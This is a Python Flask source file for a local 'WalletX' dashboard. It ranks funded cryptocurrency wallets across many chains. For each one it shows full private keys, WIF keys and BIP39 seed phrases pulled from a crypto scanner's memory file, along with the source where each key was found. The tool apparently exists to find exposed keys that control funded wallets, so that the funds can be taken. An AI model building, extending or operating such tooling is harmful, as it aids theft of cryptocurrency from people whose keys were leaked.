#!/usr/bin/env python3
"""
WalletX Web Dashboard — self-contained Flask app on localhost:8080.

Serves a full HTML/JS dashboard with:
  - Orange/black/white theme, buttons, smooth scrolling
  - Live wallet leaderboard + detail panels
  - Search, filter by chain, sort
  - Full keys/addresses — NEVER truncated
  - Auto-refresh every 5 seconds
  - Works in any browser; "Add to Home Screen" for app-like experience

Spawned by dashgo.  All data from the live SQLite cache + scanner pipeline.
"""
from __future__ import annotations

import json
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List

HOME = Path(os.path.expanduser("~"))
sys.path.insert(0, str(HOME))

import balance_db as db

try:
    from flask import Flask, jsonify, request, render_template_string
except ImportError:
    print("[!] Flask not installed. Run: pip install flask", file=sys.stderr)
    sys.exit(1)

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

# ── HTML template (single page, all inline) ─────────────────────────
HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#000000">
<title>WalletX</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font:14px/1.5 'SF Mono','Fira Code',monospace;overflow-x:hidden}
#app{max-width:100%;margin:0 auto;padding:8px}
hdr{display:flex;align-items:center;gap:12px;padding:12px 8px;border-bottom:2px solid #ff8c00;margin-bottom:8px;flex-wrap:wrap}
hdr .logo{font-size:22px;font-weight:bold;color:#ff8c00}
hdr .stat{font-size:12px;color:#888}
hdr .stat .val{color:#ffd700}
hdr .live{color:#0f0}
hdr .cached{color:#666}
#stats{display:flex;gap:16px;flex-wrap:wrap;padding:8px;background:#111;border-radius:4px;margin-bottom:8px}
#stats .s{font-size:11px;color:#888}
#stats .s .n{color:#ffd700;font-weight:bold}
#searchbar{display:flex;gap:8px;padding:8px 0;flex-wrap:wrap}
#searchbar input,#searchbar select,#searchbar button{padding:8px 12px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:4px;font:inherit}
#searchbar input{flex:1;min-width:200px}
#searchbar button{background:#ff8c00;color:#000;font-weight:bold;border:none;cursor:pointer}
#searchbar button:active{opacity:.8}
#main{display:flex;gap:8px;height:calc(100vh - 200px)}
#leaderboard{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:280px}
#detail{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:280px;padding:12px}
.wallet{padding:8px 12px;border-bottom:1px solid #1a1a1a;cursor:pointer;display:flex;gap:8px;align-items:center;font-size:13px}
.wallet:hover{background:#1a1a1a}
.wallet.active{background:#2a1a00;border-left:3px solid #ff8c00}
.wallet .r{color:#ff8c00;font-weight:bold;min-width:32px}
.wallet .c{color:#0af;min-width:40px;font-size:11px}
.wallet .bal{color:#0f0;text-align:right;min-width:100px}
.wallet .addr{color:#999;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px}
#detail .section{margin-bottom:16px}
#detail .label{color:#ff8c00;font-weight:bold;display:block;margin-bottom:4px}
#detail .val{word-break:break-all;font-size:13px;line-height:1.6;color:#ffd700}
#detail .addr-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #1a1a1a;font-size:12px}
#detail .addr-row .chain{color:#0af;min-width:50px}
#detail .addr-row .bal{color:#0f0;min-width:100px;text-align:right}
#detail .addr-row .addr{color:#999;flex:1;margin:0 8px;word-break:break-all}
#detail .addr-row .usd{color:#ffd700;min-width:80px;text-align:right}
#detail .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
#detail .btns button{padding:6px 12px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:4px;cursor:pointer;font:inherit;font-size:12px}
#detail .btns button:hover{background:#2a1a00}
.nav{display:flex;gap:8px;justify-content:center;padding:12px}
.nav button{padding:10px 24px;background:#ff8c00;color:#000;font-weight:bold;border:none;border-radius:4px;cursor:pointer;font:inherit;font-size:14px}
.nav button:disabled{opacity:.4}
.nav .pg{color:#888;font-size:13px;align-self:center}
#toast{position:fixed;bottom:20px;right:20px;background:#ff8c00;color:#000;padding:12px 20px;border-radius:4px;font-weight:bold;display:none;z-index:99}
@media(max-width:768px){#main{flex-direction:column;height:auto}#leaderboard,#detail{max-height:50vh}}
</style>
</head>
<body>
<div id="app">
<hdr>
<div class="logo">🔥 WALLETX</div>
<div class="stat">Total: <span class="val" id="stTotal">-</span></div>
<div class="stat">Funded: <span class="val" id="stFunded">-</span></div>
<div class="stat">Hits: <span class="val" id="stHits">-</span></div>
<div class="stat" id="stLive">● LIVE</div>
<span style="flex:1"></span>
<div class="stat" id="clock">--</div>
</hdr>
<div id="stats"></div>
<div id="searchbar">
<input type="text" id="q" placeholder="Search address fragment, chain, balance..." oninput="doSearch()">
<select id="chainFilter" onchange="doFilter()">
<option value="">All chains</option>
<option>ETH</option><option>MATIC</option><option>BTC</option><option>SOL</option><option>BNB</option><option>AVAX</option><option>BASE</option><option>ARB</option><option>OP</option><option>LTC</option><option>DOGE</option><option>XRP</option><option>MONAD</option>
</select>
<select id="sortBy" onchange="doFilter()">
<option value="balance">Sort: Balance</option>
<option value="ts">Sort: Recent</option>
<option value="chain">Sort: Chain</option>
</select>
<button onclick="doFilter()">🔍 Filter</button>
<button onclick="location.reload()">🔄 Refresh</button>
</div>
<div id="main">
<div id="leaderboard"></div>
<div id="detail"><div style="color:#666;text-align:center;margin-top:40px">Select a wallet to view full details</div></div>
</div>
<div class="nav">
<button onclick="prevPage()" id="btnPrev">◀ Prev</button>
<span class="pg" id="pgInfo">Page 1</span>
<button onclick="nextPage()" id="btnNext">Next ▶</button>
</div>
</div>
<div id="toast"></div>
<script>
let PAGE=0,PERPAGE=50,TOTAL=0,focus=null,wallets=[],autoTimer=null;
async function load(){
 try{
  let u=`/api/balances?limit=${PERPAGE}&offset=${PAGE*PERPAGE}&funded_only=true&sort_by=${document.getElementById('sortBy').value}`;
  let c=document.getElementById('chainFilter').value;if(c)u+=`&chain=${c}`;
  if(document.getElementById('q').value)u=`/api/search?q=${encodeURIComponent(document.getElementById('q').value)}&limit=${PERPAGE}&offset=${PAGE*PERPAGE}`;
  let r=await fetch(u),d=await r.json();
  wallets=d.rows||d;TOTAL=d.total||wallets.length;
  let s=await fetch('/api/stats').then(r=>r.json());
  document.getElementById('stTotal').textContent=s.total;
  document.getElementById('stFunded').textContent=s.nonzero;
  document.getElementById('stHits').textContent=s.hits;
  document.getElementById('stLive').innerHTML=s.last_check_ts&&(Date.now()/1000-s.last_check_ts)<300?'<span class="live">● LIVE</span>':'<span class="cached">○ CACHED</span>';
  document.getElementById('clock').textContent=new Date().toISOString().slice(11,19)+' UTC';
  let sh='';if(s.chain_totals)for(let[c,v]of Object.entries(s.chain_totals))sh+=`<span class="s"><span class="n">${c}</span> ${v.toFixed(2)}</span> `;
  document.getElementById('stats').innerHTML=sh;
  renderLb();
  document.getElementById('pgInfo').textContent=`Page ${PAGE+1} · ${TOTAL} total`;
  document.getElementById('btnPrev').disabled=PAGE<=0;
  document.getElementById('btnNext').disabled=(PAGE+1)*PERPAGE>=TOTAL;
 }catch(e){console.error(e)}
}
function renderLb(){
 let lb=document.getElementById('leaderboard'),h='';
 wallets.forEach((w,i)=>{
  let bal=w.balance;let bs=bal>1e6?(bal/1e6).toFixed(1)+'M':bal>1?(bal).toFixed(2):bal>1e-8?bal.toFixed(8):'0';
  let addr=(w.address||'');let as=addr.length>20?addr.slice(0,10)+'...'+addr.slice(-8):addr;
  h+=`<div class="wallet${focus===i?' active':''}" onclick="showDetail(${i})" title="${addr}">
   <span class="r">#${PAGE*PERPAGE+i+1}</span>
   <span class="c">${(w.chain||'?').toUpperCase()}</span>
   <span class="bal">${bs}</span>
   <span class="addr">${as}</span>
  </div>`;
 });
 lb.innerHTML=h||'<div style="color:#666;padding:12px">No funded wallets found</div>';
}
async function showDetail(i){
 focus=i;renderLb();
 let w=wallets[i],d=document.getElementById('detail');
 let bal=w.balance,bs=bal>1e6?(bal/1e6).toFixed(6)+'M':bal>1?bal.toFixed(6):bal.toFixed(12);
 let html=`<div class="section"><span class="label">RANK</span><span class="val">#${PAGE*PERPAGE+i+1} / ${TOTAL}</span></div>
 <div class="section"><span class="label">CHAIN</span><span class="val">${(w.chain||'?').toUpperCase()}</span></div>
 <div class="section"><span class="label">ADDRESS (FULL — no truncation)</span><span class="val" style="font-size:11px">${w.address||''}</span></div>
 <div class="section"><span class="label">BALANCE</span><span class="val">${bs}</span></div>
 <div class="section"><span class="label">CHECKED</span><span class="val">${w.checked_at||'unknown'}</span></div>
 <div class="section"><span class="label">STATUS</span><span class="val">${w.live?'● LIVE':'○ CACHED'} ${w.settled?'SETTLED':''}</span></div>
 <div class="btns"><button onclick="copyAddr('${w.address}')">📋 Copy Address</button><button onclick="openExplorer('${w.chain}','${w.address}')">🔗 Explorer</button></div>
 <div id="keySection" style="margin-top:16px"><span style="color:#888">🔑 Loading key material from scanner memory...</span></div>`;
 d.innerHTML=html;
 // Fetch full key material asynchronously
 let addr=encodeURIComponent(w.address||'');
 try{
  let r=await fetch('/api/wallet/'+addr),kd=await r.json();
  let ks=document.getElementById('keySection');
  if(!kd.found){ks.innerHTML='<div class="section"><span class="label">🔑 KEY MATERIAL</span><span class="val" style="color:#888">'+kd.reason+'</span></div>';return}
  let kh='<div class="section"><span class="label">🔑 KEY MATERIAL (FULL — NEVER TRUNCATED)</span></div>';
  if(kd.hex_keys&&kd.hex_keys.length){
   kh+='<div class="section"><span class="label">HEX PRIVATE KEYS ('+kd.hex_keys.length+')</span>';
   kd.hex_keys.forEach((k,j)=>{kh+='<div class="val" style="font-size:10px;word-break:break-all;margin:4px 0">['+(j+1)+'] '+k+' <button onclick="copyAddr(\''+k+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>'});
   kh+='</div>';
  }
  if(kd.wifs&&kd.wifs.length){
   kh+='<div class="section"><span class="label">WIF KEYS ('+kd.wifs.length+')</span>';
   kd.wifs.forEach((k,j)=>{kh+='<div class="val" style="font-size:10px;word-break:break-all;margin:4px 0">['+(j+1)+'] '+k+' <button onclick="copyAddr(\''+k+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>'});
   kh+='</div>';
  }
  if(kd.seeds&&kd.seeds.length){
   kh+='<div class="section"><span class="label">🌱 BIP39 SEED PHRASES ('+kd.seeds.length+')</span>';
   kd.seeds.forEach((k,j)=>{
    let id='seed_'+j+'_'+Date.now();
    window['_seed_'+id]=k;
    kh+='<div class="val" style="font-size:11px;word-break:break-all;margin:4px 0;background:#0a0a0a;padding:8px;border:1px solid #333;border-radius:4px">['+(j+1)+'] '+k+' <button data-copy-id="seed_'+id+'" class="copyBtn" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>';
   });
   kh+='</div>';
  }
  if(kd.chain_addresses){
   kh+='<div class="section"><span class="label">CHAIN ADDRESSES FROM MEMORY</span>';
   for(let[c,addrs]of Object.entries(kd.chain_addresses)){
    addrs.forEach(a=>{kh+='<div class="addr-row"><span class="chain">'+c.toUpperCase()+'</span><span class="addr">'+a+'</span><span class="usd"><button onclick="copyAddr(\''+a+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></span></div>'});
   }
   kh+='</div>';
  }
  if(kd.source){kh+='<div class="section"><span class="label">SOURCE</span><span class="val" style="font-size:11px">'+kd.source+'</span></div>'}
  if(kd.timestamp){kh+='<div class="section"><span class="label">FOUND</span><span class="val">'+kd.timestamp+'</span></div>'}
  ks.innerHTML=kh;
 }catch(e){document.getElementById('keySection').innerHTML='<span style="color:#f44">Key lookup failed: '+e.message+'</span>'}
}
function copyAddr(a){navigator.clipboard.writeText(a);toast('Copied!')}
document.addEventListener('click',function(e){let b=e.target.closest('.copyBtn');if(b){let id=b.getAttribute('data-copy-id');if(id&&window['_seed_'+id]){navigator.clipboard.writeText(window['_seed_'+id]);toast('Copied!')}}})
function openExplorer(c,a){
 let urls={ETH:`https://etherscan.io/address/${a}`,MATIC:`https://polygonscan.com/address/${a}`,BTC:`https://mempool.space/address/${a}`,SOL:`https://solscan.io/account/${a}`,BNB:`https://bscscan.com/address/${a}`,AVAX:`https://snowtrace.io/address/${a}`,BASE:`https://basescan.org/address/${a}`,ARB:`https://arbiscan.io/address/${a}`,OP:`https://optimistic.etherscan.io/address/${a}`,LTC:`https://litecoinspace.org/address/${a}`};
 window.open(urls[c.toUpperCase()]||urls.ETH,'_blank');
}
function toast(m){let t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',2000)}
function prevPage(){if(PAGE>0){PAGE--;load()}}
function nextPage(){PAGE++;load()}
function doSearch(){PAGE=0;load()}
function doFilter(){PAGE=0;load()}
document.addEventListener('keydown',e=>{if(e.key==='ArrowRight')nextPage();if(e.key==='ArrowLeft')prevPage();if(e.key==='r')location.reload()});
autoTimer=setInterval(load,8000);
load();
</script>
</body>
</html>"""


# ── API routes ───────────────────────────────────────────────────────

@app.route("/")
def index():
    from flask import Response
    dash = HOME / "walletx_dashboard.html"
    if dash.exists():
        return Response(dash.read_text(encoding="utf-8"), mimetype="text/html")
    return Response(HTML, mimetype="text/html")


@app.route("/api/stats")
def api_stats():
    return jsonify(db.get_stats())


@app.route("/api/balances")
def api_balances():
    chain = request.args.get("chain")
    min_bal = request.args.get("min_balance", type=float)
    funded_only = request.args.get("funded_only", "true").lower() == "true"
    limit = min(int(request.args.get("limit", 50)), 1000)
    offset = max(0, int(request.args.get("offset", 0)))
    sort_by = request.args.get("sort_by", "balance")
    rows, total = db.filter_balances(
        chain=chain, min_balance=min_bal, funded_only=funded_only,
        limit=limit, offset=offset, sort_by=sort_by,
    )
    return jsonify({"rows": rows, "total": total})


@app.route("/api/search")
def api_search():
    q = request.args.get("q", "").strip()
    if not q:
        return jsonify([])
    limit = min(int(request.args.get("limit", 100)), 500)
    offset = max(0, int(request.args.get("offset", 0)))
    results = db.search_addresses(q, limit=limit)
    return jsonify({"rows": results[offset:offset+limit], "total": len(results)})


@app.route("/api/hits")
def api_hits():
    limit = min(int(request.args.get("limit", 50)), 200)
    return jsonify(db.get_recent_hits(limit=limit))


@app.route("/api/health")
def api_health():
    return jsonify({"status": "ok", "ts": time.time()})


# ── Full key material lookup from scanner memory ──────────────────
MEMORY_FILE = HOME / "crypto_scanner_memory.jsonl"
_memory_cache: dict = {"ts": 0.0, "records": []}


def _load_memory() -> list:
    """Load scanner memory records. Cached for 30s."""
    now = time.time()
    if now - _memory_cache["ts"] < 30 and _memory_cache["records"]:
        return _memory_cache["records"]
    records = []
    if MEMORY_FILE.exists():
        try:
            with open(MEMORY_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        records.append(json.loads(line))
                    except Exception:
                        pass
        except Exception:
            pass
    _memory_cache["ts"] = now
    _memory_cache["records"] = records
    return records


@app.route("/api/wallet/<path:address>")
def api_wallet_detail(address: str):
    """Return full key material for any address found in scanner memory.

    Searches all memory records for the given address (any chain, any
    derived address).  Returns full private keys, WIFs, BIP39 seeds,
    hex keys, linked cross-references — NEVER truncated."""
    from urllib.parse import unquote
    addr = unquote(address).strip()
    if not addr:
        return jsonify({"found": False, "reason": "empty address"})

    addr_lower = addr.lower()
    records = _load_memory()
    best = None
    best_keys = 0

    for rec in records:
        f = rec.get("findings") or {}
        wallet = f.get("wallet") or {}
        hex_keys = wallet.get("hex_keys") or f.get("hex_key") or []
        wifs = wallet.get("wifs") or f.get("wif") or []
        seeds = wallet.get("seed_phrases") or f.get("seed_phrase") or []
        derived = f.get("derived_addresses") or []

        # Check if this address appears anywhere in this record
        matched = False

        # Check derived addresses
        for d in derived:
            if isinstance(d, dict) and (d.get("address") or "").lower() == addr_lower:
                matched = True
                break

        # Check chain-specific address lists
        if not matched:
            for chain_key in ("btc", "eth", "ltc", "sol", "doge", "xrp", "matic",
                              "avax", "bnb", "base", "arb", "op", "monad", "ton"):
                chain_addrs = f.get(chain_key) or []
                if isinstance(chain_addrs, list):
                    for ca in chain_addrs:
                        if isinstance(ca, str) and ca.lower() == addr_lower:
                            matched = True
                            break
                if matched:
                    break

        if not matched:
            continue

        n_keys = len(hex_keys) + len(wifs) + len(seeds)
        if n_keys >= best_keys:
            # Collect all data
            entry = {
                "hex_keys": list(hex_keys),       # FULL — never truncated
                "wifs": list(wifs),               # FULL
                "seeds": list(seeds),             # FULL
                "derived_addresses": derived,     # FULL list
                "source": rec.get("source") or rec.get("source_uri") or "",
                "timestamp": rec.get("ts") or rec.get("timestamp") or "",
            }
            # Also collect any direct address findings
            for chain_key in ("btc", "eth", "ltc", "sol", "doge", "xrp", "matic",
                              "avax", "bnb", "base", "arb", "op", "monad"):
                vals = f.get(chain_key) or []
                if vals:
                    entry.setdefault("chain_addresses", {})[chain_key] = list(vals)
            best = entry
            best_keys = n_keys

    if best is None:
        return jsonify({"found": False, "address": addr,
                         "reason": "address not in scanner memory — may be from balance_hit only"})

    return jsonify({"found": True, "address": addr, **best})


# ── Main ─────────────────────────────────────────────────────────────

def import_existing_cache():
    """On first run, import balance_cache.jsonl into SQLite."""
    jsonl = HOME / "balance_cache.jsonl"
    if jsonl.exists():
        count = db.count_balances()
        if count == 0:
            n = db.import_from_jsonl(str(jsonl))
            print(f"[walletx-server] imported {n} records from balance_cache.jsonl")
        else:
            print(f"[walletx-server] SQLite already has {count} records — skipping import")
    else:
        print("[walletx-server] no balance_cache.jsonl found — starting fresh")


def main():
    import_existing_cache()
    stats = db.get_stats()
    print(f"[walletx-server] starting on http://localhost:8080")
    print(f"  balances: {stats['total']}  funded: {stats['nonzero']}  hits: {stats['hits']}")
    app.run(host="127.0.0.1", port=8080, debug=False, threaded=True)


if __name__ == "__main__":
    main()
